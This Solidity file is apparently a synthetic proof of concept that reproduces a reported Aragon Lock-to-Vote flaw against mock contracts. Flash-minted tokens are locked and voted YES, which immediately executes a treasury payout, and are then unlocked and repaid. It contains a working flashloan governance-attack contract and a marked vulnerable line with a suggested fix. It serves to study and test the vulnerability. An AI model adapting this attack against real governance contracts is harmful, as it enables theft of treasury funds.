// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Aragon Lock-to-Vote — EarlyExecution flashloan vote attack
    (Spearbit July 2025, finding #62256)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: with VotingMode.EarlyExecution, a YES vote that pushes the
    proposal over the support threshold immediately executes it. Flashloaned
    (or flashminted) tokens can be locked, used to cast that YES vote, then
    unlocked and repaid in the same transaction — so anyone can early-execute
    a proposal without lasting economic stake.
    Harm: a governance treasury payout executes via ephemeral flashloaned
    voting power; the attacker receives the pot and holds no locked tokens.
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Flash-mint lender: mints lock tokens, calls borrower, expects full repay.
contract FlashMinter {
    MockToken public token;

    constructor(MockToken t) {
        token = t;
    }

    function flashLoan(address borrower, uint256 amount, bytes calldata data) external {
        token.mint(borrower, amount);
        IFlashBorrower(borrower).onFlashLoan(address(token), amount, data);
        require(token.transferFrom(borrower, address(this), amount), "repay");
    }
}

interface IFlashBorrower {
    function onFlashLoan(address token, uint256 amount, bytes calldata data) external;
}

interface IMajorityVoting {
    enum VoteOption {
        None,
        Abstain,
        Yes,
        No
    }
}

/// @notice Reduced LockToVotePlugin + LockManager with EarlyExecution mode.
contract LockToVotePlugin {
    enum VotingMode {
        Standard,
        EarlyExecution,
        VoteReplacement
    }

    struct Proposal {
        bool open;
        bool executed;
        uint256 yes;
        uint256 no;
        uint256 supportThreshold; // bps of yes/(yes+no)
        uint256 minParticipation; // absolute yes votes required
        VotingMode mode;
        address target;
        bytes data;
    }

    MockToken public immutable token;
    mapping(uint256 => Proposal) public proposals;
    uint256 public proposalCount;
    mapping(address => uint256) public locked;
    mapping(uint256 => mapping(address => uint256)) public votedYes;

    event ProposalExecuted(uint256 indexed proposalId);

    constructor(MockToken t) {
        token = t;
    }

    function createProposal(
        VotingMode mode,
        uint256 supportThreshold,
        uint256 minParticipation,
        address target,
        bytes calldata data
    ) external returns (uint256 id) {
        id = ++proposalCount;
        proposals[id] = Proposal({
            open: true,
            executed: false,
            yes: 0,
            no: 0,
            supportThreshold: supportThreshold,
            minParticipation: minParticipation,
            mode: mode,
            target: target,
            data: data
        });
    }

    function lock(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        locked[msg.sender] += amount;
    }

    function unlock() external {
        uint256 amt = locked[msg.sender];
        locked[msg.sender] = 0;
        token.transfer(msg.sender, amt);
    }

    /// @notice Lock `amount` and cast a YES vote (finding's lockAndVote).
    function lockAndVote(uint256 proposalId, IMajorityVoting.VoteOption option, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        locked[msg.sender] += amount;
        _vote(proposalId, msg.sender, option, amount);
    }

    function _vote(uint256 proposalId, address voter, IMajorityVoting.VoteOption option, uint256 weight) internal {
        Proposal storage p = proposals[proposalId];
        require(p.open && !p.executed, "closed");
        require(weight > 0, "no weight");

        if (option == IMajorityVoting.VoteOption.Yes) {
            p.yes += weight;
            votedYes[proposalId][voter] += weight;
        } else if (option == IMajorityVoting.VoteOption.No) {
            p.no += weight;
        }

        // EarlyExecution: if the proposal has already succeeded, execute now
        if (p.mode == VotingMode.EarlyExecution && _hasSucceeded(p)) {
            _execute(proposalId); // @> VULN: same-tx early execute after flashloaned YES vote
            // FIX: require a block delay between the succeeding vote and execute
            //      (or remove EarlyExecution — Aragon's chosen fix in PR 26)
        }
    }

    function _hasSucceeded(Proposal storage p) internal view returns (bool) {
        if (p.yes < p.minParticipation) return false;
        uint256 total = p.yes + p.no;
        if (total == 0) return false;
        return (p.yes * 10_000) / total >= p.supportThreshold;
    }

    function _execute(uint256 proposalId) internal {
        Proposal storage p = proposals[proposalId];
        require(!p.executed, "done");
        p.executed = true;
        p.open = false;
        (bool ok,) = p.target.call(p.data);
        require(ok, "action failed");
        emit ProposalExecuted(proposalId);
    }

    function isExecuted(uint256 proposalId) external view returns (bool) {
        return proposals[proposalId].executed;
    }
}

/// @dev Governance-controlled treasury of reward tokens the proposal can pay out.
contract Treasury {
    MockToken public immutable reward;
    address public plugin;

    constructor(MockToken r) {
        reward = r;
    }

    function setPlugin(address p) external {
        require(plugin == address(0), "set");
        plugin = p;
    }

    function payout(address to, uint256 amount) external {
        require(msg.sender == plugin, "only plugin");
        reward.transfer(to, amount);
    }
}

/// @dev Flashloan borrower: lock → YES (early-executes) → unlock → repay.
contract FlashVoter is IFlashBorrower {
    LockToVotePlugin public plugin;
    FlashMinter public minter;
    MockToken public token;
    uint256 public proposalId;

    constructor(LockToVotePlugin p, FlashMinter m, MockToken t) {
        plugin = p;
        minter = m;
        token = t;
    }

    function attack(uint256 _proposalId, uint256 amount) external {
        proposalId = _proposalId;
        minter.flashLoan(address(this), amount, "");
    }

    function onFlashLoan(address, uint256 amount, bytes calldata) external override {
        require(msg.sender == address(minter), "lender");
        token.approve(address(plugin), amount);
        plugin.lockAndVote(proposalId, IMajorityVoting.VoteOption.Yes, amount);
        plugin.unlock();
        token.approve(address(minter), amount);
    }
}

/// @dev Orchestrator: EarlyExecution proposal + flashloan vote that drains the treasury.
contract Exploit {
    MockToken public lockToken; // CREATE 1 — flashloanable governance token
    MockToken public reward; // CREATE 2 — treasury asset
    FlashMinter public minter; // CREATE 3
    LockToVotePlugin public plugin; // CREATE 4 — vulnerable
    Treasury public treasury; // CREATE 5
    FlashVoter public voter; // CREATE 6
    uint256 public proposalId;

    uint256 public constant FLASH_AMOUNT = 10 ether;
    uint256 public constant TREASURY_POT = 5 ether;

    constructor() {
        lockToken = new MockToken();
        reward = new MockToken();
        minter = new FlashMinter(lockToken);
        plugin = new LockToVotePlugin(lockToken);
        treasury = new Treasury(reward);
        voter = new FlashVoter(plugin, minter, lockToken);
        treasury.setPlugin(address(plugin));
        // seed treasury pot
        reward.mint(address(treasury), TREASURY_POT);
    }

    function run() external {
        // create EarlyExecution proposal: pay TREASURY_POT reward to the flash voter
        bytes memory data = abi.encodeWithSelector(Treasury.payout.selector, address(voter), TREASURY_POT);
        proposalId = plugin.createProposal(
            LockToVotePlugin.VotingMode.EarlyExecution,
            5000, // 50% support
            1, // min participation
            address(treasury),
            data
        );

        // flashloan → lock → YES → early execute → unlock → repay
        voter.attack(proposalId, FLASH_AMOUNT);

        // HARM: proposal executed via ephemeral voting power; treasury drained
        require(plugin.isExecuted(proposalId), "proposal not executed");
        require(reward.balanceOf(address(treasury)) == 0, "treasury not drained");
        require(reward.balanceOf(address(voter)) == TREASURY_POT, "voter did not receive pot");
        // no lasting stake
        require(plugin.locked(address(voter)) == 0, "still locked");
        require(lockToken.balanceOf(address(voter)) == 0, "leftover flash tokens");
    }
}
